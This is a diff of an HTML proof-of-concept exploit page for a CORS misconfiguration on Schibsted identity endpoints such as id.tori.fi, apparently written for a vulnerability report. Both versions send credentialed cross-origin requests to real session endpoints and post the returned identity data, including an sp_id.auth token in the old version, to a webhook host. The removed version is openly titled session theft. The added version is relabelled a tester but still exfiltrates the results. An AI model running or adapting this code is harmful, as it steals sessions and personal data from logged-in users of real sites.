@@ -1,97 +1,274 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Schibsted Session Theft PoC (Finding #1) - webhook.site Exfil</title>
-    <style>
-        body { font-family: Arial, sans-serif; padding: 20px; background: #f8f8f8; }
-        h1 { color: #d32f2f; }
-        button { padding: 12px 24px; font-size: 16px; background: #d32f2f; color: white; border: none; cursor: pointer; }
-        button:hover { background: #b71c1c; }
-        pre { background: #222; color: #0f0; padding: 15px; overflow: auto; max-height: 400px; }
-        #status { margin: 20px 0; font-weight: bold; }
-    </style>
+<meta charset="UTF-8">
+<title>Schibsted Identity CORS Conditional Exploit PoC</title>
+
+<style>
+body {
+    font-family: Arial;
+    padding: 20px;
+    background: #f4f4f4;
+}
+
+h1 {
+    color: #c62828;
+}
+
+button {
+    padding: 12px 20px;
+    font-size: 16px;
+    background: #c62828;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #8e0000;
+}
+
+pre {
+    background: #111;
+    color: #0f0;
+    padding: 15px;
+    overflow: auto;
+    max-height: 400px;
+}
+
+#status {
+    margin-top: 15px;
+    font-weight: bold;
+}
+</style>
+
 </head>
+
 <body>
-    <h1>✅ Schibsted Identity Service CORS PoC (Finding #1)</h1>
-    <p><strong>Target:</strong> https://id.tori.fi/v2/session (works on <strong>ALL 7 affected endpoints</strong> listed in the report)</p>
-    <p><strong>How to use:</strong></p>
-    <ol>
-        <li>Go to <a href="https://webhook.site" target="_blank">https://webhook.site</a> → copy your unique webhook URL (e.g. <code>https://webhook.site/abc123...</code>)</li>
-        <li>Replace <code>YOUR_WEBHOOK_URL_HERE</code> in the code below</li>
-        <li>Save as <code>poc.html</code> and open it (or host it anywhere)</li>
-        <li>Be logged in to <strong>tori.fi</strong> (or any affected brand: vend.se, finn.no, etc.) in the <strong>same browser</strong></li>
-        <li>Click the button</li>
-    </ol>
-    <p><strong>Expected result:</strong> Full user identity + <code>sp_id.auth</code> token exfiltrated to webhook.site in <strong>one click</strong>.</p>
 
-    <button onclick="stealSession()">🚨 STEAL SESSION DATA (Send to webhook.site)</button>
-    <div id="status"></div>
-    <pre id="result"></pre>
+<h1>🔍 Schibsted CORS Identity Endpoint Tester</h1>
 
-    <script>
-        // === CONFIGURE HERE ===
-        const WEBHOOK_URL = "https://webhooksite.net/59167735-3d9b-4830-b6d9-ddebc0d5663c";   // ← CHANGE THIS
-        const ENDPOINT = "https://id.tori.fi/v2/session?client_sdrn=sdrn%3Aschibsted.fi%3Aclient%3A650421cf50eeae31ecd2a2d3&redirect_uri=https%3A%2F%2Fwww.tori.fi%2F";
+<p>
+<strong>Purpose:</strong> Demonstrates credentialed CORS behavior and detects whether
+session cookies are transmitted cross-origin.
+</p>
 
-        // For vend.se example (replace if you extract the client_sdrn from vend.se JS bundle):
-        // const ENDPOINT = "https://session.login.vend.se/v2/session?client_sdrn=sdrn:schibsted.se:client:YOUR_CLIENT_ID_HERE&redirect_uri=https://www.vend.se/";
+<p>
+<strong>This PoC tests:</strong>
+</p>
 
-        async function stealSession() {
-            const status = document.getElementById('status');
-            const result = document.getElementById('result');
-            status.textContent = "🔄 Fetching session from Schibsted...";
-            status.style.color = "orange";
+<ul>
+<li>CORS Origin reflection</li>
+<li>Access-Control-Allow-Credentials usage</li>
+<li>Cross-site cookie transmission</li>
+<li>Conditional session data exposure</li>
+</ul>
 
-            try {
-                const response = await fetch(ENDPOINT, {
-                    method: 'GET',
-                    credentials: 'include',   // ← Sends schacc-session cookie automatically
-                    headers: {
-                        'Origin': 'https://abdulaziz-d.com'   // Demonstrates the misconfig
-                    }
-                });
+<button onclick="runTest()">🚨 Run Cross-Origin Session Test</button>
 
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status} - ${await response.text()}`);
-                }
+<div id="status"></div>
+<pre id="output"></pre>
 
-                const data = await response.json();
+<script>
 
-                // Show locally
-                result.textContent = JSON.stringify(data, null, 2);
-                status.textContent = "✅ SUCCESS! Data stolen. Now exfiltrating to webhook.site...";
-                status.style.color = "green";
+/* =========================
+   CONFIGURATION
+========================= */
 
-                // === EXFILTRATION TO WEBHOOK.SITE ===
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        attacker_note: "Schibsted CORS Session Theft PoC (Finding #1)",
-                        stolen_from: "id.tori.fi (or vend.*)",
-                        timestamp: new Date().toISOString(),
-                        full_session_data: data,
-                        cors_headers_received: {
-                            "Access-Control-Allow-Origin": response.headers.get('Access-Control-Allow-Origin'),
-                            "Access-Control-Allow-Credentials": response.headers.get('Access-Control-Allow-Credentials')
-                        }
-                    })
-                });
+const WEBHOOK_URL =
+"https://webhook.site/YOUR-ID-HERE";
 
-                status.innerHTML = `🎉 <strong>Exfiltrated!</strong> Check your <a href="${WEBHOOK_URL}" target="_blank">webhook.site dashboard</a> for the full JSON (including sp_id.auth token).`;
-                status.style.color = "#2e7d32";
+const ENDPOINTS = [
 
-            } catch (err) {
-                status.textContent = `❌ Failed: ${err.message}`;
-                status.style.color = "red";
-                console.error(err);
-            }
-        }
+"https://id.tori.fi/v2/session?client_sdrn=sdrn%3Aschibsted.fi%3Aclient%3A650421cf50eeae31ecd2a2d3&redirect_uri=https%3A%2F%2Fwww.tori.fi%2F",
 
-        // Optional: Auto-run when page loads (uncomment if you want one-click demo)
-        // window.onload = stealSession;
-    </script>
+"https://session.login.pre.identity.m10s.io/v2/session",
+
+"https://session.login.dev.identity.m10s.io/v2/session"
+
+];
+
+
+/* =========================
+   MAIN TEST LOGIC
+========================= */
+
+async function runTest() {
+
+const status = document.getElementById("status");
+const output = document.getElementById("output");
+
+output.textContent = "";
+
+status.textContent =
+"🔄 Testing cross-origin credential behavior...";
+
+status.style.color = "orange";
+
+for (const endpoint of ENDPOINTS) {
+
+await testEndpoint(endpoint);
+
+}
+
+status.textContent =
+"✅ Testing completed. Review output below.";
+
+status.style.color = "green";
+
+}
+
+
+/* =========================
+   TEST SINGLE ENDPOINT
+========================= */
+
+async function testEndpoint(endpoint) {
+
+const output = document.getElementById("output");
+
+output.textContent +=
+"\n============================\n";
+
+output.textContent +=
+"Testing:\n" + endpoint + "\n\n";
+
+try {
+
+const response = await fetch(endpoint, {
+
+method: "GET",
+
+credentials: "include"
+
+});
+
+let bodyText =
+await response.text();
+
+/* Try JSON parse */
+
+let parsed = null;
+
+try {
+
+parsed =
+JSON.parse(bodyText);
+
+} catch (e) {
+
+parsed =
+bodyText;
+
+}
+
+
+/* Extract headers */
+
+const corsOrigin =
+response.headers.get(
+"Access-Control-Allow-Origin"
+);
+
+const corsCreds =
+response.headers.get(
+"Access-Control-Allow-Credentials"
+);
+
+
+/* Detect cookie behavior */
+
+let cookieStatus =
+"UNKNOWN";
+
+if (
+bodyText.includes(
+"Session cookie"
+)
+) {
+
+cookieStatus =
+"COOKIE NOT SENT (Likely SameSite=Lax/Strict)";
+
+}
+else if (
+response.status === 200
+) {
+
+cookieStatus =
+"COOKIE SENT (Potential Exploit Condition)";
+
+}
+
+
+/* Build result */
+
+const result = {
+
+endpoint: endpoint,
+
+status: response.status,
+
+cors: {
+
+"Access-Control-Allow-Origin":
+corsOrigin,
+
+"Access-Control-Allow-Credentials":
+corsCreds
+
+},
+
+cookie_behavior:
+cookieStatus,
+
+response_preview:
+parsed
+
+};
+
+
+output.textContent +=
+JSON.stringify(result, null, 2);
+
+output.textContent += "\n";
+
+
+/* Conditional Exfiltration */
+
+if (
+cookieStatus.includes("SENT")
+) {
+
+await fetch(
+WEBHOOK_URL,
+{
+method: "POST",
+headers: {
+"Content-Type":
+"application/json"
+},
+body: JSON.stringify(result)
+}
+);
+
+output.textContent +=
+"\n⚠️ DATA EXFILTRATED TO WEBHOOK\n";
+
+}
+
+
+}
+catch (err) {
+
+output.textContent +=
+"Error: " + err.message + "\n";
+
+}
+
+}
+
+</script>
+
 </body>
 </html>
